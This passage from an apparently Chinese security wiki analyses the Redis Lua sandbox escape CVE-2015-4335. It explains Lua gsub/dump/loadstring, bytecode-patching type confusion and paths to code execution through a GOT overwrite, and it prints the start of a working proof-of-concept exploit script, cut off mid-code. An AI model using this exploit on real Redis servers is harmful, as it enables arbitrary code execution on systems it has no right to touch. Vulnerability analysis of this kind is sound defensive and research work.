[,m])</li><li>解释：这个函数会返回一个替换后的副本，原串中所有的符合参数<code>pattern</code>的子串都将被参数<code>repl</code>所指定的字符串所替换，如果指定了参数<code>m</code>，那么只替换查找过程的前<code>m</code>个匹配的子串，参数<code>repl</code>可以是一个字符串、表、或者是函数，并且函数可以将匹配的次数作为函数的第二个参数返回，接下来看看参数<code>repl</code>的含义：</li><li>如果参数<code>repl</code>是一个常规字符串，成功匹配的子串会被<code>repl</code>直接替换，如果参数<code>repl</code>中包含转移字符<code>%</code>，那么可以采用<code>%n</code>的形式替换，当<code>%n</code>中的<code>n</code>取值1-9时，表示一次匹配中的第n个子串，当其中的<code>n</code>为0时，表示这次匹配的整个子串，<code>%%</code>表示一个单独的<code>%</code>。</li><li>如果参数<code>repl</code>是一个表，那么每次匹配中的第一个子串将会作为整个表的键，取table[匹配子串]来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为table的键值。</li><li>如果参数<code>repl</code>是一个函数，那么每一次匹配的子串都将作为整个函数的参数，取function(匹配子串)来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为函数的参数。如果函数的返回值是一个数字或者是字符串，那么会直接拿来替换，如果它返回<code>false</code>或者<code>nil</code>，替换动作将不会发生，如果返回其他的值将会报错。</li></ul><hr><p><strong>Usage</strong></p><ul><li>首先新建一个文件将文件命名为gsubtest.lua然后编写如下代码：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-- 常规替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;(%w+)&quot;</span>, <span class="string">&quot;lua&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 都用匹配的第一个串*2来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;(%w+)&quot;</span>, <span class="string">&quot;%1 %1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 用匹配出的完成串*2来替换第一次匹配的结果</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;%w+&quot;</span>, <span class="string">&quot;%0 %0&quot;</span>, 1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 使用一个完整匹配和一个匹配的第二个串来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world from c to lua&quot;</span>, <span class="string">&quot;(%w+) (%a+)&quot;</span>, <span class="string">&quot;%0 %2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用系统函数来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;os = <span class="variable">$OS</span>, pathext = <span class="variable">$PATHEXT</span>&quot;</span>, <span class="string">&quot;%<span class="subst">$(%w+)</span>&quot;</span>, os.getenv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用自定义函数</span><br><span class="line">x = string.gsub(<span class="string">&quot;4 + 5 = <span class="variable">$return</span> 4+5$&quot;</span>, <span class="string">&quot;%<span class="subst">$(.-)</span>%$&quot;</span>, <span class="keyword">function</span> (s)</span><br><span class="line">      <span class="built_in">return</span> loadstring(s)()</span><br><span class="line">    end)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用表来替换</span><br><span class="line"><span class="built_in">local</span> t = &#123;name=<span class="string">&quot;lua&quot;</span>, version=<span class="string">&quot;5.1&quot;</span>&#125;</span><br><span class="line">x = string.gsub(<span class="string">&quot;<span class="variable">$name</span>-<span class="variable">$version</span>.tar.gz&quot;</span>, <span class="string">&quot;%<span class="subst">$(%w+)</span>&quot;</span>, t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br></pre></td></tr></table></figure><ul><li>有一点需要注意的是，使用函数作为替换结果时，函数只能返回数字、字符串、<code>false</code>和<code>nil</code>。</li></ul><p><strong>string.dump()</strong></p><ul><li>原型：string.dump (function)</li><li>解释：返回一个包含所给函数二进制描述的字符串，以至于在此之后可以使用函数<code>loadstring()</code>利用所得到的字符串来返回一个函数拷贝，需要注意的是函数只能是Lua函数并且没有upvalues(外部局部变量)。</li></ul><hr><p><strong>Usage</strong></p><ul><li>首先新建一个文件将文件命名为dumptest.lua如下代码:</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">--自定义一个函数</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_func</span>(<span class="params">num1, num2</span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">ret</span> = <span class="title">num1</span> + <span class="title">num2</span></span>;</span><br><span class="line">    print(<span class="string">&quot;\nnum1 = &quot;</span>..num1)</span><br><span class="line">    print(<span class="string">&quot;num2 = &quot;</span>..num2)</span><br><span class="line">    print(<span class="string">&quot;num1 + num2 = &quot;</span>..ret)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">-- 将函数序列化</span><br><span class="line">local func_content = string.dump(custom_func)</span><br><span class="line">print(<span class="string">&quot;\nfunc_content = &quot;</span>..func_content)</span><br><span class="line"></span><br><span class="line">-- 将转化后的字符串写入文件</span><br><span class="line">local outfile = io.open(<span class="string">&quot;dumptest.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">local outnum = outfile:write(func_content)</span><br><span class="line"><span class="attr">outfile</span>:close()</span><br><span class="line"></span><br><span class="line">-- 从文件总读取内容</span><br><span class="line">local infile = io.open(<span class="string">&quot;dumptest.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">local incontent = infile:read(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line"><span class="attr">infile</span>:close()</span><br><span class="line">print(<span class="string">&quot;\ninput content is &quot;</span>..incontent)</span><br><span class="line"></span><br><span class="line">-- 加载函数</span><br><span class="line">local myfunc = loadstring(incontent)</span><br><span class="line"></span><br><span class="line">-- 执行函数</span><br><span class="line">myfunc(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">myfunc(<span class="number">3</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">-- 输出这个幸福的七月七</span><br><span class="line">myfunc(<span class="string">&quot;7&quot;</span> ,<span class="string">&quot;.7&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;\nthis is a happy day!&quot;</span>)</span><br><span class="line">print(os.date())</span><br></pre></td></tr></table></figure><ul><li>看了这个函数是不是有种非常神奇的感觉，原来传说中的序列化可以离我们这么近。</li><li>在调用了函数<code>string.dump()</code>之后函数<code>custom_func()</code>被转化成字符串保存在文件中，可以在使用时再取出来。</li><li>这个函数一般写逻辑代码应该用不到，更多的是做框架的时候用的功能，进过序列化的函数可以通过网络传送、转化、再使用。</li></ul><p><strong>loadstring()</strong></p><ul><li>loadstring(string [,chunkname])</li><li>解释：函数会从所给的字符串中来加载程序块并运行，常使用这种构造式来调用<code>assert(loadstring(s))()</code>，如果省略参数<code>chunkname</code>，那么它默认为所给的字符串。</li></ul><hr><p><strong>usage</strong></p><ul><li>首先我们新建一个文件将文件命名为loadstring.lua然后编写代码如下：</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">--</span> 简单测试</span><br><span class="line">local ret <span class="operator">=</span> loadstring(<span class="string">&quot;print(<span class="subst">\&quot;</span>first test loadstring function.<span class="subst">\&quot;</span>)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result ret is&quot;</span>, ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 运行返回值</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result of running ret() is:&quot;</span>)</span><br><span class="line">ret();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 使用常用的方式</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result of running common test is:&quot;</span>)</span><br><span class="line"><span class="built_in">assert</span>(loadstring(<span class="string">&quot;print(<span class="subst">\&quot;</span>common test loadstring function.<span class="subst">\&quot;</span>)&quot;</span>))()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 直接生成一个全局函数</span><br><span class="line">local <span class="function"><span class="keyword">func</span> <span class="title">=</span> </span>loadstring(<span class="string">&quot;function func_test(str) print(<span class="subst">\&quot;</span>str = <span class="subst">\&quot;</span>, str) end&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 测试函数是否生成</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>before run func, functest =&quot;</span>, func_test)</span><br><span class="line"><span class="function"><span class="keyword">func</span>()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>after run func, functest =&quot;</span>, func_test, <span class="string">&quot;<span class="subst">\n</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 测试参数chunkname的作用</span><br><span class="line"><span class="built_in">assert</span>(loadstring(<span class="string">&quot;i = i + 1&quot;</span>, <span class="string">&quot;third test&quot;</span>))()</span><br></pre></td></tr></table></figure><ul><li>由结果一可知，函数<code>loadstring()</code>与函数<code>loadfile()</code>一样，都是返回一个函数。</li><li>由结果二可知，返回函数的内容就是字符串参数<code>string</code>的内容，执行返回的函数时，字符串中的代码就被执行了。</li><li>结果三展示了这个函数的一般使用方法。</li><li>结果四展示了如何通过字符串生成一个全局函数，但是无法生成局部函数，并且生成的函数<code>func_test()</code>在调用完函数<code>func()</code>之后才被创建出来</li><li>最后一个例子展示了参数<code>chunkname</code>的作用，就是在错误的提示信息中起到提示作用。</li></ul><h4 id="lua数据结构–闭包"><a href="#lua数据结构–闭包" class="headerlink" title="lua数据结构–闭包"></a><strong>lua数据结构–闭包</strong></h4><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/7.png"></p><p>闭包主要由以下2个元素组成：</p><p><strong>函数原型：</strong>上图意在表明是一段可执行代码。在Lua中可以是lua_CFunction，也可以是lua自身的虚拟机指令。</p><p>上下文环境：在Lua里主要是Upvalues和env，下面会有说明Upvalues和env。 在Lua里，我们也从闭包开始，逐步看出整个结构模型，下面是Closure的数据结构：(lobject.h 291-312)</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        Lua的闭包分成2类，一类是CClosure，即luaC函数的闭包。另一类是LClosure，是Lua里面原生的函数的闭包。</p><p>​        分析一下两类Closure相同部分ClosureHeader：</p><ul><li><p>CommonHeader：和与TValue中的GCHeader能对应起来的部分</p></li><li><p>isC：是否CClosure</p></li><li><p>nupvalues：外部对象个数</p></li><li><p>gclist：用于GC销毁</p></li><li><p>env：函数的运行环境</p></li></ul><p>对于CClosure数据结构：</p><ul><li><p>lua_CFunction f：函数指针，指向自定义的C函数</p></li><li><p>TValue upvalue[1]：C的闭包中，用户绑定的任意数量个upvalue</p></li></ul><p>对于LClosure数据结构：</p><ul><li><p>Proto *p：Lua的函数原型，在下面会有详细说明</p></li><li><p>UpVal *upvals：Lua的函数upvalue，这里的类型是UpVal，这里之所以不直接用TValue是因为具体实现需要一些额外数据。</p></li></ul><p><strong>UpVal的实现</strong></p><p>什么是UpVal？先来看看代码：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/9.png"></p><p>​        分析一下上面这段代码，最终testB的值显然是3+5+10=18。当调用testA(5)的时候，其实是在调用FuncB(5)，但是这个FuncB知道a = 3，这个是由<strong>FuncA调用时</strong>，记录到FuncB的<strong>外部变量</strong>，我们把a和c称为FuncB的upvalue。</p><p>​        下面描述一下<strong>Lua中的原生函数的函数原型</strong>，即<strong>Proto数据结构</strong>（lobject.h 231-253）：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/12.png"></p><ul><li><p>CommonHeader：Proto也是需要回收的对象，也会有与GCHeader对应的CommonHeader</p></li><li><p>TValue* k：函数使用的常量数组，比如local d = 10，则会有一个10的数值常量</p></li><li><p>Instruction *code：虚拟机指令码数组</p></li><li><p>Proto **p：函数里定义的函数的函数原型，比如funcA里定义了funcB，在funcA的5. Proto中，这个指针的[0]会指向funcB的Proto</p></li><li><p>int *lineinfo：主要用于调试，每个操作码所对应的行号</p></li><li><p>LocVar *locvars：主要用于调试，记录每个本地变量的名称和作用范围</p></li><li><p>TString **upvalues：一来用于调试，二来用于给API使用，记录所有upvalues的名称</p></li><li><p>TString *source：用于调试，函数来源，如c:\t1.lua@ main</p></li><li><p>sizeupvalues： upvalues名称的数组长度</p></li><li><p>sizek：常量数组长度</p></li><li><p>sizecode：code数组长度</p></li><li><p>sizelineinfo：lineinfo数组长度</p></li><li><p>sizep：p数组长度</p></li><li><p>sizelocvars：locvars数组长度</p></li><li><p>linedefined：函数定义起始行号，即function语句行号</p></li><li><p>lastlinedefined：函数结束行号，即end语句行号</p></li><li><p>gclist：用于回收</p></li><li><p>nups：upvalue的个数，其实在Closure里也有nupvalues，这里我也不太清楚为什么要弄两个，nups是语法分析时会生成的，而nupvalues是动态计算的。</p></li><li><p>numparams：参数个数</p></li><li><p>is_vararg：是否参数是”…”（可变参数传递）</p></li><li><p>maxstacksize：函数所使用的stacksize</p><p>​    Proto的所有参数都是在<strong>语法分析和中间代码生成时获取的</strong>，相当于编译出来的汇编码一样是不会变的，动态性是在Closure中体现的。</p></li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p><p>具备任意地址读/写能力后是一定可以做代码执行的，目前想到如下两种方式。</p><p><strong>1) 覆写CClosure-&gt;f</strong></p><p>​        在lua中可以使用coroutine.wrap创建C函数闭包对象CClosure，其结构如下：</p><p>​        CClosure-&gt;f指向函数指针，调用其对应的源码为deps/lua/src/ldo.c 307-326：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/22.png"></p><p><strong>2) 覆写got</strong></p><p>​        Linux PWN常规思路，通过DynELF解析Binary，进一步解析libc，获取system地址并覆写至fputs.got；在lua中调用print(“id”)即可执行命令。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p><p>​        这里以Redis 3.0.0版本进行分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">asnum = loadstring(string.dump(function(x)</span><br><span class="line">  for i = x, x, 0 do</span><br><span class="line">    return i</span><br><span class="line">  end</span><br><span class="line">end):gsub(&quot;\96%z%z\128&quot;, &quot;\22\0\0\128&quot;))</span><br></pre></td></tr></table></figure><p>LUA字节码固定长度32bits，4字节，定义如下：</p><p>主要由op操作码、R(A)、R(B)、R(C)、R(Bx)、R(sBx)组成。A、B、C对应于LUA寄存器索引。</p><p>asnum函数可以将任意LUA对象转换为数字。（注：LUA5.1 64bitLinux环境）gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>。</p><p><strong>1) OP_FORPREP/OP_FORLOOP</strong></p><p>​        lua中对for循环生成的字节码，利用luadec反编译工具查看.out文件的字节码如下：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        可以看到for循环是由FORPREP、FORLOOP两条指令组合而来，对应的源码是deps/lua/src/lvm.c 的luaV_execute函数（line 654-680）：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        在OP_FORPREP中，lua对参数进行类型检查，判断是否为number类型，若不是则触发错误；然而在OP_FORLOOP中，因已做过类型检查，便假定参数为number类型，并对其执行idx = idx + step操作，这导致任意类型到number类型的混淆。</p><p>​        如下修改字节码中的FORPREP指令<code>\96%z%z\128</code>为JMP指令<code>\22\0\0\128</code>，gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>，如下。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        正常情况下lua在forprep指令会检查参数是否为数字类型，并执行初始化，但是由于执行gsub函数后，forprep字节码被替换为JMP to 5，直接跳过OP_FORPREP中的类型检查，直接进入OP_FORLOOP (5)：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        forloop指令直接将循环参数转换为lua_Number(double)类型，（因为正常情况下forprep已经检查过类型了），然后执行加法（+ 0），执行dojump return x；返回lua_Number。LUA使用TValue表示通用数据对象，格式如下:</p><table><thead><tr><th>Value(64bit)</th><th>tt(32bit)</th><th>padd(32bit)</th></tr></thead><tbody><tr><td>n</td><td><code>LUA_TNUMBER</code></td><td></td></tr><tr><td><code>GCObject *gc; -&gt; TString*</code></td><td><code>LUA_TSTRING</code></td><td></td></tr><tr><td><code>GCObject *gc; -&gt; Closure*</code></td><td><code>LUA_TFUNCTION</code></td><td></td></tr></tbody></table><p><strong>2) OP_CLOSURE</strong></p><p>​        LUA使用CLOSURE A Bx指令创建函数的一个实例(或闭包)。Bx是要实例化的函数在函数原型表中的函数编号。例如：closure 2 0 ，创建0号函数对象，结果保存到2号寄存器。对CLOSURE指令的处理位于deps/lua/src/lvm.c 的luaV_execute函数（line 723-742）：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/6.png"></p><p>​        line 731-737是对闭包的处理，具体为在CLOSURE指令后后生成对应的MOVE指令，MOVE指令的第二个参数为闭包变量引用。正常情况下引用只能指向当前栈桢中的局部变量，但通过修改字节码，可以将其指向至任意位置。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/13.png"></p><p>​        如上，通过修改”(\100%z%z%z)….”（MOVE 0 0）为”%1\0\0\0\1”（MOVE 0 2），将middle函数中的magic引用指向middle函数自身（R2），所以输出的结果为middle函数。</p><p>​        对函数调用的处理位于deps/lua/src/lvm.c line 586-606：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/14.png"></p><p>​         对函数返回的处理位于deps/lua/src/lvm.c line 382-390：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        line 385将L-&gt;ci-&gt;func（当前函数指针）转换为Closure指针，由上文可知，通过修改字节码可以将闭包变量引用指向当前函数指针，导致任意类型到Closure类型的混淆。</p><p>​        基于此，结合number类型混淆，可以做任意地址读/写：</p><p>​        结尾处修改字节码，将middle/inner函数中的magic引用指向middle函数；inner函数中将magic赋值为字符串，这使得middle函数中的当前函数指针将被混淆为该字符串，函数返回； middle函数中读取闭包变量magic，读取闭包变量对应的源码为deps/lua/src/lvm.c line 427-431：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/16.png"></p><p>​        其实际上是去当前函数指针的upvals字段中获取相应引用，而当前函数指针已被混淆为字符串，对应的upvals字段可控。</p><p>TString类型与Closure类型的结构如下：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/17.png"></p><p>​        变量upval为字符串，as_double(upval)获取其TString指针，偏移24获取到upval-&gt;str地址，也就是说cl-&gt;p、cl-&gt;upvals[0]都指向输入的字符串”commonhead16bits” .. p32(lo) .. p32(hi)。</p><p>​        UpVal结构如下：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/18.png"></p><p>​        所以cl-&gt;upvals[0]-&gt;v指向构造的指针p32(lo) .. p32(hi)，也即为addr。</p><p>​        以上，便将任意地址的前8字节读取出来，写操作也是同理，只需要在middle函数中对magic赋值，需注意的是写操作实际会写入8字节数值及4字节tt类型：</p><p>​        deps/lua/src/lvm.c line 451-456：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/19.png"></p><p>​        deps/lua/src/lobject.h line 161-164：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/20.png"></p><p>触发poc.lua</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">asnum = loadstring(string.dump(function(x)</span><br><span class="line">  for i = x, x, 0 do</span><br><span class="line">    return i</span><br><span class="line">  end</span><br><span class="line">end):gsub(&quot;\96%z%z\128&quot;, &quot;\22\0\0\128&quot;))</span><br><span class="line"></span><br><span class="line">ub4 = function(x) -- Convert little endian uint32_t to char[4]</span><br><span class="line">  local b0 = x % 256; x = (x - b0) / 256</span><br><span class="line">  local b1 = x % 256; x = (x - b1) / 256</span><br><span class="line">  local b2 = x % 256; x = (x - b2) / 256</span><br><span class="line">  local b3 = x % 256</span><br><span class="line">  return string.char(b0, b1, b2, b3)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">f2ii = function(x) -- Convert double to uint32_t[2]</span><br><span class="line">  if x == 0 then return 0, 0 end</span><br><span class="line">  if x &lt; 0 then x = -x end</span><br><span class="line"></span><br><span class="line">  local e_lo, e_hi, e, m = -1075, 1023</span><br><span class="line">  while true do -- this loop is math.frexp</span><br><span class="line">    e = (e_lo + e_hi)</span><br><span class="line">    e = (e - (e % 2)) / 2</span><br><span class="line">    m = x / 2^e</span><br><span class="line">    if m &lt; 0.5 then e_hi = e elseif 1 &lt;= m then e_lo = e else break end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if e+1023 &lt;= 1 then</span><br><span class="line">    m = m * 2^(e+1074)</span><br><span class="line">    e = 0</span><br><span class="line">  else</span><br><span class="line">    m = (m - 0.5) * 2^53</span><br><span class="line">    e = e + 1022</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  local lo = m % 2^32</span><br><span class="line">  m = (m - lo) / 2^32</span><br><span class="line">  local hi = m + e * 2^20</span><br><span class="line">  